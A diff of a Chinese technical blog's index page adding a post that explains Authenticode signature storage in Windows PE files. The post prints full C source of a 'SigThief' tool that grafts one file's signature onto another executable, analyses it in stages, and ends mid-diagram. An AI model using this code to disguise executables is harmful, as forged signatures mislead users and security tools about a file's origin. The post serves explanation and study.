@@ -143,7 +143,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -154,7 +154,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -171,6 +171,233 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://jojojoin.github.io/2026/04/03/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/142400352?v=4">
+      <meta itemprop="name" content="JoJoJoin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JoJoJoin 的博客">
+      <meta itemprop="description" content="一个关于技术和生活的个人博客">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | JoJoJoin 的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/03/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">数字签名伪造原理</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-04-03 21:55:17 / 修改时间：21:58:59" itemprop="dateCreated datePublished" datetime="2026-04-03T21:55:17+08:00">2026-04-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">技术</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Windows 下的数字签名（Authenticode）是验证可执行文件来源和完整性的重要机制。但由于 PE 文件格式的设计特点，数字签名数据可以被从一个已签名的文件”偷取”并嫁接到另一个未签名的文件上。本文将通过分析一段签名偷取工具的源码，深入剖析其原理，并讨论这种伪造签名的实际效果与局限性。</p>
+<h2 id="PE-文件中的数字签名存储机制"><a href="#PE-文件中的数字签名存储机制" class="headerlink" title="PE 文件中的数字签名存储机制"></a>PE 文件中的数字签名存储机制</h2><h3 id="IMAGE-DIRECTORY-ENTRY-SECURITY"><a href="#IMAGE-DIRECTORY-ENTRY-SECURITY" class="headerlink" title="IMAGE_DIRECTORY_ENTRY_SECURITY"></a>IMAGE_DIRECTORY_ENTRY_SECURITY</h3><p>PE 文件的数字签名信息存储在 <strong>Optional Header</strong> 的 <strong>Data Directory</strong> 数组中，索引为 <code>IMAGE_DIRECTORY_ENTRY_SECURITY</code>（值为 4）的条目指向签名数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Optional Header</span><br><span class="line">├── ...</span><br><span class="line">├── DataDirectory[0]  → Export Table</span><br><span class="line">├── DataDirectory[1]  → Import Table</span><br><span class="line">├── ...</span><br><span class="line">├── DataDirectory[4]  → Security Directory  ← 签名在这里</span><br><span class="line">├── ...</span><br><span class="line">└── DataDirectory[15] → Reserved</span><br></pre></td></tr></table></figure>
+
+<p>该条目包含两个关键字段：</p>
+<ul>
+<li><strong>VirtualAddress</strong>：签名数据在文件中的<strong>原始偏移</strong>（注意：这是唯一一个使用文件偏移而非 RVA 的 Data Directory 条目）</li>
+<li><strong>Size</strong>：签名数据的大小</li>
+</ul>
+<p>签名数据本身是一个 <code>WIN_CERTIFICATE</code> 结构，包含 PKCS#7 格式的 Authenticode 签名，通常被附加在 PE 文件的最末尾，不属于任何节区（Section）。</p>
+<h3 id="签名数据的特殊性"><a href="#签名数据的特殊性" class="headerlink" title="签名数据的特殊性"></a>签名数据的特殊性</h3><p>与其他 Data Directory 条目不同，Security Directory 有一个关键特性：</p>
+<blockquote>
+<p><strong><code>VirtualAddress</code> 字段存储的是文件偏移（File Offset），而非 RVA（Relative Virtual Address）。</strong></p>
+</blockquote>
+<p>这意味着签名数据不参与内存映射，它只存在于磁盘文件中，位于所有节区数据之后。这个设计特性使得签名的”移植”成为可能——只需要复制二进制数据并修改目录条目的指向即可。</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>以下是签名偷取工具的完整源码及逐段分析：</p>
+<h3 id="完整源码"><a href="#完整源码" class="headerlink" title="完整源码"></a>完整源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Usage: SigThief.exe SourceFile.exe TargetFile.exe\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PCH SourceFile = argv[<span class="number">1</span>];</span><br><span class="line">    PCH TargetFile = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] SourceFile : %s\r\n&quot;</span>, SourceFile);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] TargetFile : %s\r\n&quot;</span>, TargetFile);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span>* sigMem = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="type">char</span>* notSigMem = <span class="literal">NULL</span>;</span><br><span class="line">		FILE* sigFile = <span class="literal">NULL</span>;</span><br><span class="line">		FILE* notSigFile = <span class="literal">NULL</span>;</span><br><span class="line">		fopen_s(&amp;sigFile, SourceFile, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!sigFile)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;SourceFile fopen failed [ErrCode]:%d\r\n&quot;</span>,GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		fseek(sigFile, <span class="number">0</span>, SEEK_END);</span><br><span class="line">		<span class="type">size_t</span> sigFileLength = ftell(sigFile);</span><br><span class="line">		rewind(sigFile);</span><br><span class="line"></span><br><span class="line">		sigMem = (<span class="type">char</span>*)<span class="built_in">malloc</span>(sigFileLength);</span><br><span class="line">		<span class="built_in">memset</span>(sigMem, <span class="number">0</span>, sigFileLength);</span><br><span class="line">		fread(sigMem, sigFileLength, <span class="number">1</span>, sigFile);</span><br><span class="line">		fclose(sigFile);</span><br><span class="line"></span><br><span class="line">		fopen_s(&amp;notSigFile, TargetFile, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!notSigFile)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(sigMem);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;TargetFile fopen failed [ErrCode]:%d\r\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		fseek(notSigFile, <span class="number">0</span>, SEEK_END);</span><br><span class="line">		<span class="type">size_t</span> notSigFileLength = ftell(notSigFile);</span><br><span class="line">		rewind(notSigFile);</span><br><span class="line"></span><br><span class="line">		notSigMem = (<span class="type">char</span>*)<span class="built_in">malloc</span>(notSigFileLength);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memset</span>(notSigMem, <span class="number">0</span>, notSigFileLength);</span><br><span class="line">		fread(notSigMem, notSigFileLength, <span class="number">1</span>, notSigFile);</span><br><span class="line">		fclose(notSigFile);</span><br><span class="line"></span><br><span class="line">		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)sigMem;</span><br><span class="line">		PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(sigMem + pDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">		PIMAGE_DOS_HEADER pDos1 = (PIMAGE_DOS_HEADER)notSigMem;</span><br><span class="line">		PIMAGE_NT_HEADERS pNts1 = (PIMAGE_NT_HEADERS)(notSigMem + pDos1-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pNts1-&gt;Signature != <span class="number">0x4550</span> || pNts-&gt;Signature != <span class="number">0x4550</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(sigMem);</span><br><span class="line">			<span class="built_in">free</span>(notSigMem);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;File is not PE Format!!!\r\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (pNts1-&gt;FileHeader.Machine != pNts-&gt;FileHeader.Machine)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(sigMem);</span><br><span class="line">			<span class="built_in">free</span>(notSigMem);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;PE Format Not Match!!!\r\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		PUCHAR fw = <span class="literal">NULL</span>;</span><br><span class="line">		ULONG fwisze = <span class="literal">NULL</span>;</span><br><span class="line">		ULONG SigVirtualAddress = <span class="number">0</span>;</span><br><span class="line">		ULONG sigSize = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (pNts-&gt;OptionalHeader.Magic == <span class="number">0x20B</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			PIMAGE_NT_HEADERS64 pNts = (PIMAGE_NT_HEADERS64)(sigMem + pDos-&gt;e_lfanew);</span><br><span class="line">			PIMAGE_DATA_DIRECTORY Pdir = &amp;pNts-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];</span><br><span class="line">			SigVirtualAddress = Pdir-&gt;VirtualAddress;</span><br><span class="line">			sigSize = Pdir-&gt;Size;</span><br><span class="line"></span><br><span class="line">			fwisze = notSigFileLength + sigSize;</span><br><span class="line">			fw = (PUCHAR)<span class="built_in">malloc</span>(fwisze);</span><br><span class="line">			<span class="built_in">memset</span>(fw, <span class="number">0</span>, fwisze);</span><br><span class="line">			<span class="built_in">memcpy</span>(fw, notSigMem, notSigFileLength);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			PIMAGE_DOS_HEADER pDos32 = (PIMAGE_DOS_HEADER)sigMem;</span><br><span class="line">			PIMAGE_NT_HEADERS32 pNts32 = (PIMAGE_NT_HEADERS32)(sigMem + pDos32-&gt;e_lfanew);</span><br><span class="line">			PIMAGE_DATA_DIRECTORY Pdir = &amp;pNts32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];</span><br><span class="line">			SigVirtualAddress = Pdir-&gt;VirtualAddress;</span><br><span class="line">			sigSize = Pdir-&gt;Size;</span><br><span class="line"></span><br><span class="line">			fwisze = notSigFileLength + sigSize;</span><br><span class="line">			fw = (PUCHAR)<span class="built_in">malloc</span>(fwisze);</span><br><span class="line">			<span class="built_in">memset</span>(fw, <span class="number">0</span>, fwisze);</span><br><span class="line">			<span class="built_in">memcpy</span>(fw, notSigMem, notSigFileLength);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pNts1-&gt;OptionalHeader.Magic == <span class="number">0x20B</span>)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			PIMAGE_DOS_HEADER pDos64w = (PIMAGE_DOS_HEADER)fw;</span><br><span class="line">			PIMAGE_NT_HEADERS64 pNts64w = (PIMAGE_NT_HEADERS64)(fw + pDos64w-&gt;e_lfanew);</span><br><span class="line">			PIMAGE_DATA_DIRECTORY Pdirw = &amp;pNts64w-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];</span><br><span class="line">			PIMAGE_SECTION_HEADER pImageSection = IMAGE_FIRST_SECTION(pNts64w);</span><br><span class="line">			pImageSection += (pNts64w-&gt;FileHeader.NumberOfSections - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">			ULONG VirtualAddressW = (pImageSection-&gt;PointerToRawData + pImageSection-&gt;SizeOfRawData);</span><br><span class="line">			<span class="built_in">memcpy</span>(fw + VirtualAddressW, sigMem + SigVirtualAddress, sigSize);</span><br><span class="line">			Pdirw-&gt;VirtualAddress = VirtualAddressW;</span><br><span class="line">			Pdirw-&gt;Size = sigSize;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			PIMAGE_DOS_HEADER pDos32w = (PIMAGE_DOS_HEADER)fw;</span><br><span class="line">			PIMAGE_NT_HEADERS pNts32w = (PIMAGE_NT_HEADERS)(fw + pDos32w-&gt;e_lfanew);</span><br><span class="line">			PIMAGE_DATA_DIRECTORY Pdirw = &amp;pNts32w-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];</span><br><span class="line">			PIMAGE_SECTION_HEADER pImageSection = IMAGE_FIRST_SECTION(pNts32w);</span><br><span class="line">			pImageSection += (pNts32w-&gt;FileHeader.NumberOfSections - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">			ULONG VirtualAddressW = (pImageSection-&gt;PointerToRawData + pImageSection-&gt;SizeOfRawData);</span><br><span class="line">			<span class="built_in">memcpy</span>(fw + VirtualAddressW, sigMem + SigVirtualAddress, sigSize);</span><br><span class="line">			Pdirw-&gt;VirtualAddress = VirtualAddressW;</span><br><span class="line">			Pdirw-&gt;Size = sigSize;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">free</span>(notSigMem);</span><br><span class="line">		<span class="built_in">free</span>(sigMem);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (fw)</span><br><span class="line">		&#123;</span><br><span class="line">			CHAR GenFilePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">			FILE* file = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="built_in">strcpy</span>(GenFilePath, TargetFile);</span><br><span class="line">			<span class="built_in">strcat</span>(GenFilePath, <span class="string">&quot;.bak&quot;</span>);</span><br><span class="line">			rename(TargetFile, GenFilePath);</span><br><span class="line">			fopen_s(&amp;file, TargetFile, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (!file)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">free</span>(fw);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			fwrite(fw, fwisze, <span class="number">1</span>, file);</span><br><span class="line">			fclose(file);</span><br><span class="line">			<span class="built_in">free</span>(fw);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[+] Success !!!\r\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第一阶段：读取源文件和目标文件"><a href="#第一阶段：读取源文件和目标文件" class="headerlink" title="第一阶段：读取源文件和目标文件"></a>第一阶段：读取源文件和目标文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fopen_s(&amp;sigFile, SourceFile, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="comment">// ... 读取 SourceFile（有签名的文件）到 sigMem</span></span><br><span class="line">fopen_s(&amp;notSigFile, TargetFile, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="comment">// ... 读取 TargetFile（要伪造签名的文件）到 notSigMem</span></span><br></pre></td></tr></table></figure>
+
+<p>将两个文件完整读入内存，为后续的 PE 头解析和数据操作做准备。</p>
+<h3 id="第二阶段：PE-格式校验"><a href="#第二阶段：PE-格式校验" class="headerlink" title="第二阶段：PE 格式校验"></a>第二阶段：PE 格式校验</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)sigMem;</span><br><span class="line">PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(sigMem + pDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNts1-&gt;Signature != <span class="number">0x4550</span> || pNts-&gt;Signature != <span class="number">0x4550</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 不是有效的 PE 文件</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNts1-&gt;FileHeader.Machine != pNts-&gt;FileHeader.Machine)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 架构不匹配（x86 vs x64）</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过检查 <code>PE\0\0</code>（0x4550）签名确认两个文件都是合法的 PE 文件，并校验 Machine 字段确保架构一致。</p>
+<h3 id="第三阶段：从源文件提取签名位置和大小"><a href="#第三阶段：从源文件提取签名位置和大小" class="headerlink" title="第三阶段：从源文件提取签名位置和大小"></a>第三阶段：从源文件提取签名位置和大小</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pNts-&gt;OptionalHeader.Magic == <span class="number">0x20B</span>) <span class="comment">// PE32+（64位）</span></span><br><span class="line">&#123;</span><br><span class="line">    PIMAGE_NT_HEADERS64 pNts = (PIMAGE_NT_HEADERS64)(sigMem + pDos-&gt;e_lfanew);</span><br><span class="line">    PIMAGE_DATA_DIRECTORY Pdir = &amp;pNts-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];</span><br><span class="line">    SigVirtualAddress = Pdir-&gt;VirtualAddress;  <span class="comment">// 签名数据的文件偏移</span></span><br><span class="line">    sigSize = Pdir-&gt;Size;                       <span class="comment">// 签名数据的大小</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据 Optional Header 的 <code>Magic</code> 字段判断是 PE32（0x10B）还是 PE32+（0x20B），然后从对应的 <code>DataDirectory[4]</code> 中取出签名数据的偏移和大小。</p>
+<p>此时 <code>sigMem + SigVirtualAddress</code> 就指向了源文件中的 Authenticode 签名二进制数据。</p>
+<h3 id="第四阶段：将签名嫁接到目标文件"><a href="#第四阶段：将签名嫁接到目标文件" class="headerlink" title="第四阶段：将签名嫁接到目标文件"></a>第四阶段：将签名嫁接到目标文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定位目标文件最后一个节区的末尾</span></span><br><span class="line">PIMAGE_SECTION_HEADER pImageSection = IMAGE_FIRST_SECTION(pNts64w);</span><br><span class="line">pImageSection += (pNts64w-&gt;FileHeader.NumberOfSections - <span class="number">1</span>);</span><br><span class="line">ULONG VirtualAddressW = (pImageSection-&gt;PointerToRawData + pImageSection-&gt;SizeOfRawData);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将签名数据复制到目标文件末尾</span></span><br><span class="line"><span class="built_in">memcpy</span>(fw + VirtualAddressW, sigMem + SigVirtualAddress, sigSize);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新目标文件的 Security Directory 条目</span></span><br><span class="line">Pdirw-&gt;VirtualAddress = VirtualAddressW;</span><br><span class="line">Pdirw-&gt;Size = sigSize;</span><br></pre></td></tr></table></figure>
+
+<p>这是整个工具的<strong>核心操作</strong>：</p>
+<ol>
+<li>找到目标文件最后一个节区的末尾位置（<code>PointerToRawData + SizeOfRawData</code>）</li>
+<li>将源文件的签名二进制数据原封不动地复制到该位置</li>
+<li>修改目标文件 PE 头的 <code>IMAGE_DIRECTORY_ENTRY_SECURITY</code> 条目，使其 <code>VirtualAddress</code> 指向新附加的签名数据，<code>Size</code> 设为签名数据的大小</li>
+</ol>
+<h3 id="第五阶段：写出文件"><a href="#第五阶段：写出文件" class="headerlink" title="第五阶段：写出文件"></a>第五阶段：写出文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(TargetFile, GenFilePath);          <span class="comment">// 原文件备份为 .bak</span></span><br><span class="line">fopen_s(&amp;file, TargetFile, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">fwrite(fw, fwisze, <span class="number">1</span>, file);             <span class="comment">// 写出带有偷取签名的新文件</span></span><br></pre></td></tr></table></figure>
+
+<p>将原始目标文件重命名为备份，然后将修改后的数据写出为新文件。</p>
+<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p>整个操作流程可以用下图概括：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────┐     ┌─────────────────────┐</span><br><span class="line">│   SourceFile (已签名) │     │  TargetFile (未签名)  │</span><br><span class="line">│                     │     │                     │</span><br><span class="line">│  ┌───────────────┐  │     │  ┌───────────────┐  │</span><br><span class="line">│  │   PE Header   │  │     │  │   PE Header   │  │</span><br><span class="line">│  │  Security Dir │──┼──┐  │  │  Security Dir │  │</span><br><span class="line">│  │  VA=0x1A000   │  │  │  │  │  VA=0 Size=0  │  │</span><br><span class="line">│  │  Size=0x2800  │  │  │  │  └───────────────┘  │</span><br><span class="line">│  └───────────────┘  │  │  │  ┌───────────────┐  │</span><br><span class="line">│  ┌───────────────┐  │  │  │  │   Sections    │  │</span><br><span class="line">│  │   Sections    │  │  │  │  └───────────────┘  │</span><br><span class="line">│  └───────────────┘  │  │  └─────────────────────┘</span><br><span class="line">│  ┌───────────────┐  │  │</span><br><span class="line">│  │  Signature    │◄─┘  │            │</span><br><span class="line">│  │  (PKCS#7)     │     │            ▼</span><br><span class="line">│  └───────────────┘     │</span><br><span class="line">└─────────────────────┘  │  ┌─────────────────────┐</span><br><span class="line">                         │  │  TargetFile (伪造后)  │</span><br><span class="line">         复制签名数据     │  │                     │</span><br><span class="line">         ─────────────►  │  │  ┌───────────────┐  │</span><br><span class="line">                         │  │  │   PE Header   │  │</span><br><span class="line">                         │  │  │  Security Dir │──┼──┐</span><br><span class="line">                         │  │  │  VA=新偏移     │  │  │</span><br><span class="line">                         │  │  │  Size=0x2800  │  │  │</span><br><span class="line">                         │  │  └───────────────┘  │  │</span><br><span class="line">                         │  │  